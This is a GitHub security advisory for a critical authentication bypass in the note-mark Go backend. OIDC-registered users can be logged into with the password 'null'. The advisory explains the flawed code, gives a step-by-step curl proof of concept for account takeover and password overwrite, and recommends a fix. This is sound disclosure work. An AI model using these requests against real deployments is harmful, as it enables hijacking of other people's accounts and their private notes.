# [C] Note Mark: OIDC-registered users authenticated by submitting password "null"

## Summary
Severity: Critical
Advisory: GHSA-pxf8-6wqm-r6hh
CVE: CVE-2026-41571
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-04-25
Source: https://github.com/advisories/GHSA-pxf8-6wqm-r6hh
Type: github-advisory

## Affected
- Go: `github.com/enchant97/note-mark/backend` — affected >=0 <0.0.0-20260417132909-dea5530cc989

## Details
## Summary

`IsPasswordMatch` in `backend/db/models.go` falls back to a hard-coded `bcrypt("null")` placeholder whenever a user has no stored password. OIDC-registered users are created with an empty password, so anyone who submits `password: "null"` to the internal login endpoint receives a valid session for that user. The bypass is unauthenticated and requires no user interaction.

## Details

`backend/db/models.go:36` defines the placeholder hash used by the timing-attack mitigation inside `IsPasswordMatch`:

```go
var nullPasswordHash, _ = bcrypt.GenerateFromPassword([]byte("null"), bcrypt.DefaultCost)
```

`IsPasswordMatch` (`backend/db/models.go:46-58`) substitutes that placeholder when the stored password is empty:

```go
func (u *User) IsPasswordMatch(plainPassword string) bool {
    var current []byte
    if len(u.Password) == 0 {
        // prevent CWE-208
        current = nullPasswordHash
    } else {
        current = u.Password
    }
    if err := bcrypt.CompareHashAndPassword(current, []byte(plainPassword)); err == nil {
        return true
    }
    return false
}
```

OIDC-registered users are stored with an empty password at `backend/services/auth.go:102-115`:

```go
return db.DB.Transaction(func(tx *gorm.DB) error {
    user := db.User{
        Username: username,
        Password: []byte(""),
    }
    // ...
})
```

The internal login endpoint (`POST /api/auth/token`, handled at `backend/services/auth.go:20-54`) calls `IsPasswordMatch` with the caller-supplied password. For any OIDC-only user, `bcrypt.CompareHashAndPassword(nullPasswordHash, []byte("null"))` returns nil, the function returns true, and the server issues a `Auth-Session-Token` cookie.

`EnableInternalLogin` defaults to `true`, and `GET /api/info` discloses both OIDC configuration and internal-login status. `enableAnonymousUserSearch` also defaults to `true`, so an unauthenticated caller enumerates usernames via `GET /api/users/search` before touching the login endpoint.

Once the session is issued, `PUT /api/users/me/password` accepts `existingPassword: "null"` because the same `IsPasswordMatch` routine verifies the existing password. The caller writes a new password onto the OIDC user's row, which locks the legitimate OIDC user out on the next internal-login path.

## Proof of Concept

Tested against `note-mark` v0.19.2.

Step 1: Start note-mark pointed at any OIDC provider and set `OIDC__ENABLE_USER_CREATION=true`. The defaults for `ENABLE_INTERNAL_LOGIN` and `ENABLE_ANONYMOUS_USER_SEARCH` do not need to be changed.

```bash
docker run -d --name note-mark-poc \
  -e OIDC__PROVIDER_NAME=example \
  -e OIDC__CLIENT_ID=note-mark \
  -e OIDC__CLIENT_SECRET=secret \
  -e OIDC__ISSUER_URL=https://your-oidc-provider/ \
  -e OIDC__ENABLE_USER_CREATION=true \
  -p 8088:8080 ghcr.io/enchant97/note-mark-backend:0.19.2
```

Step 2: Alice registers via the OIDC flow. `TryCreateNewOidcUser` stores her row with `Password = []byte("")`.

Step 3: Bob confirms the preconditions.

```bash
curl -s http://localhost:8088/api/info
# {"allowInternalLogin":true,"oidcProvider":"example","enableAnonymousUserSearch":true,...}
```

Step 4: Bob logs in as Alice via the internal endpoint.

```bash
curl -i -X POST http://localhost:8088/api/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"grant_type":"password","username":"alice","password":"null"}'
```

Response:

```
HTTP/1.1 204 No Content
Set-Cookie: Auth-Session-Token=eyJ...; Path=/; HttpOnly; SameSite=Strict
```

Step 5: Bob uses the cookie to read Alice's account.

```bash
curl -b 'Auth-Session-Token=eyJ...' http://localhost:8088/api/users/me
# {"id":"...","username":"alice","name":"Alice"}
```

Step 6: Bob persists access by writing his own password onto Alice's row.

```bash
curl -i -b 'Auth-Session-Token=eyJ...' -X PUT \
  http://localhost:8088/api/users/me/password \
  -H 'Content-Type: application/json' \
  -d '{"existingPassword":"null","newPassword":"bob-owns-this-now"}'
# HTTP/1.1 204 No Content
```

Alice's next internal-login attempt fails; her OIDC flow still works, but Bob now holds a second valid credential on the same row.

A companion script that drives all six steps ships at `pocs/poc_014_null_password_bypass.sh`.

## Impact

Every OIDC-only user on a note-mark deployment with `ENABLE_INTERNAL_LOGIN=true` (the default) is one HTTP request from takeover. Bob reads Alice's private notebooks, her note markdown, and her uploaded assets. He writes, edits, or deletes anything Alice owns. Step 6 grants persistent access and costs Alice her account until the maintainer clears the row by hand.

The default configuration ships both authentication paths side by side, so any site that turns on OIDC is affected without further misconfiguration on the operator's part.

## Recommended Fix

The clearest fix rejects the login path for rows with no stored password. Add the check after the user lookup in `GetAccessToken`:

```go
// backend/services/auth.go:28
var user db.User
if err := db.DB.
    First(&user, "username = ?", username).
    Select("id", "password").Error; err != nil {
    user.IsPasswordMatch(password) // preserve CWE-208 timing mitigation
    return core.AccessToken{}, InvalidCredentialsError
}

if len(user.Password) == 0 {
    return core.AccessToken{}, InvalidCredentialsError
}

if !user.IsPasswordMatch(password) {
    return core.AccessToken{}, InvalidCredentialsError
}
```

The equivalent change belongs in `UpdateUserPassword` at `backend/services/users.go:53-61`, since the same routine verifies `existingPassword` during the persistence step.

Replacing `nullPasswordHash` with a per-instance unguessable plaintext closes the hole too, but relies on the placeholder staying secret:

```go
// backend/db/models.go:36
var nullPasswordHash, _ = bcrypt.GenerateFromPassword([]byte(uuid.NewString()), bcrypt.DefaultCost)
```

The explicit empty-password check is preferable because the intent is readable in the source.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/enchant97/note-mark/security/advisories/GHSA-pxf8-6wqm-r6hh
- https://nvd.nist.gov/vuln/detail/CVE-2026-41571
- https://github.com/enchant97/note-mark/commit/dea5530cc9891187b51548ef9f2868b7dc9f4e92
- https://github.com/enchant97/note-mark
- https://github.com/enchant97/note-mark/releases/tag/v0.19.3
